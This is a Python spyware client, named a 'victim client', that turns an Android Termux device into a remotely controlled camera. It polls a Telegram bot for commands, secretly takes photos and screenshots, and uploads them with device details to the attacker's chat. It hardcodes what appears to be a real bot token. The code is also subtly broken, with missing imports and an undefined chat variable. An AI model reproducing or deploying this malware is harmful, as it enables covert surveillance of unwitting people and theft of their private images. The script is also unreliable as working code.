#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# .-.-.-.-{ PHANTOM VICTIM CLIENT }-.-.-.-.
# EDUCATIONAL PURPOSES ONLY - UNAUTHORIZED USE ILLEGAL

import os
import sys
import json
import time
import argparse
import subprocess
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import requests

# Telegram Configuration
BOT_TOKEN = "6438089549:AAHbCWCGnF0GtdFygIBoHJWuRnX_zk_5aV8"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"

class VictimClient:
    def __init__(self, victim_id):
        self.victim_id = victim_id
        self.device_name = self.get_device_name()
        self.battery_level = self.get_battery_level()
        self.last_update = 0
        self.cipher = AES.new(hashlib.sha256(b"PhantomVictimClient").digest(), AES.MODE_ECB)
        self.chat_id = None
        
    def get_device_name(self):
        """Get device name"""
        try:
            return subprocess.getoutput("hostname").strip()
        except:
            return "Unknown-Device"
    
    def get_battery_level(self):
        """Get battery level"""
        try:
            battery = subprocess.getoutput("termux-battery-status")
            battery_json = json.loads(battery)
            return battery_json.get('percentage', 'N/A')
        except:
            return "N/A"
    
    def encrypt(self, data):
        """Encrypt data with AES-256"""
        return base64.b64encode(self.cipher.encrypt(pad(data.encode(), AES.block_size))).decode()
    
    def telegram_send(self, message):
        """Send encrypted message to Telegram"""
        try:
            # Add device info to every message
            device_info = f"📱 {self.device_name} 🔋 {self.battery_level}%"
            full_msg = f"{device_info}\n{message}"
            
            encrypted_msg = self.encrypt(full_msg)
            url = API_URL + "sendMessage"
            payload = {
                "chat_id": self.chat_id,
                "text": f"[VICTIM:{self.victim_id}]\n{encrypted_msg}",
                "parse_mode": "HTML"
            }
            requests.post(url, data=payload, timeout=10)
        except Exception:
            pass
    
    def telegram_send_file(self, file_path):
        """Send file to Telegram"""
        try:
            # Add device info to caption
            device_info = f"📱 {self.device_name} 🔋 {self.battery_level}%"
            
            with open(file_path, "rb") as f:
                requests.post(
                    API_URL + "sendDocument",
                    data={"chat_id": self.chat_id, "caption": device_info},
                    files={"document": (os.path.basename(file_path), f)}
                )
            return True
        except Exception:
            return False
    
    def telegram_receive(self):
        """Receive commands from Telegram"""
        try:
            response = requests.get(API_URL + "getUpdates", params={"offset": self.last_update + 1})
            data = response.json()
            
            for update in data.get("result", []):
                self.last_update = update["update_id"]
                msg = update.get("message", {}).get("text", "")
                
                if f"[VICTIM:{self.victim_id}]" in msg:
                    self.chat_id = str(update["message"]["chat"]["id"])
                    return msg
        except Exception:
            pass
        return None
    
    def capture_photo(self, camera_id=0):
        """Capture photo using device camera"""
        try:
            filename = f"photo_{int(time.time())}.jpg"
            subprocess.run(f"termux-camera-photo -c {camera_id} {filename}", shell=True)
            self.telegram_send_file(filename)
            os.remove(filename)
            return True
        except Exception:
            return False
    
    def capture_screenshot(self):
        """Capture device screen"""
        try:
            filename = f"screenshot_{int(time.time())}.png"
            subprocess.run(f"termux-screenshot {filename}", shell=True)
            self.telegram_send_file(filename)
            os.remove(filename)
            return True
        except Exception:
            return False
    
    def activate(self):
        """Activate victim client"""
        activation_msg = (
            f"[VICTIM_ACTIVATION] : {self.victim_id}\n"
            f"🔥 تم تفعيل جهاز الضحية\n"
            f"📱 الجهاز: {self.device_name}\n"
            f"🔋 البطارية: {self.battery_level}%\n"
            f"🆔 معرف الضحية: {self.victim_id}"
        )
        
        # Find controller chat ID
        url = API_URL + "sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": activation_msg,
            "parse_mode": "HTML"
        }
        requests.post(url, data=payload, timeout=10)
        
        return True
    
    def handle_commands(self):
        """Handle incoming commands"""
        while True:
            try:
                command_msg = self.telegram_receive()
                if command_msg:
                    if "[COMMAND]" in command_msg:
                        command = command_msg.split("[COMMAND]")[1].strip()
                        
                        if command.startswith("CAPTURE_PHOTO"):
                            camera_id = command.split()[1] if len(command.split()) > 1 else 0
                            self.capture_photo(int(camera_id))
                            
                        elif command == "CAPTURE_SCREENSHOT":
                            self.capture_screenshot()
            except Exception:
                pass
            
            time.sleep(10)
    
    def main(self):
        """Main operational loop"""
        # Activate victim
        self.activate()
        
        # Start command handler
        threading.Thread(target=self.handle_commands).start()
        
        # Keep alive
        while True:
            time.sleep(60)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--victim-id", required=True, help="Victim ID")
    args = parser.parse_args()
    
    victim = VictimClient(args.victim_id)
    victim.main()
